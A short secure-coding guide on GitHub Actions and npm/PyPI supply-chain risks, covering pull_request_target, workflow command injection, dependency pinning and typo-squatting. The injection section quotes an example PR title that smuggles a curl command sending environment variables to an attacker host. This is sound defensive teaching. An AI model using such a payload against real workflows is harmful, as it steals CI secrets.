# CI/CD & Supply Chain Security

## GitHub Actions Security

### Unsafe Use of `pull_request_target`
- The `pull_request_target` event runs workflows with the permissions of the base branch, giving it access to secrets. If your workflow checks out untrusted PR code and executes it (e.g., `npm install`, running tests, or building the app), a malicious contributor can steal your secrets.
- **Only use `pull_request_target` when absolutely necessary** (like labeling or commenting on PRs) and NEVER check out and run untrusted code in that workflow. 
- Use `pull_request` instead, which runs in a safe sandbox without access to secrets.

### Command Injection in Workflows
- **Never interpolate untrusted context variables** (like `github.event.pull_request.title` or `github.head_ref`) directly into a run block. An attacker can craft a PR title like `Fix bug"; curl attacker.com/steal?env=$(env) #` to execute arbitrary code.

```yaml
# BAD: Command injection via PR title
run: echo "Processing PR: ${{ github.event.pull_request.title }}"

# GOOD: Pass via environment variable
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "Processing PR: $PR_TITLE"
```

## Supply Chain Risks (NPM, PyPI)

### Dependency Pinning
- Avoid using carets (`^`) or tildes (`~`) in your `package.json` for critical security applications. A compromised sub-dependency update could be pulled automatically during the next build. 
- Commit your `package-lock.json`, `yarn.lock`, or `pnpm-lock.yaml` to guarantee reproducible and secure builds.

### Typo-Squatting and Malicious Packages
- Verify package names carefully. Attackers often publish malicious packages with names highly similar to popular ones (e.g., `electorn` instead of `electron`).
- Regularly run `npm audit` or use tools like Snyk / Dependabot to catch known vulnerabilities (CVEs) in your dependency tree.
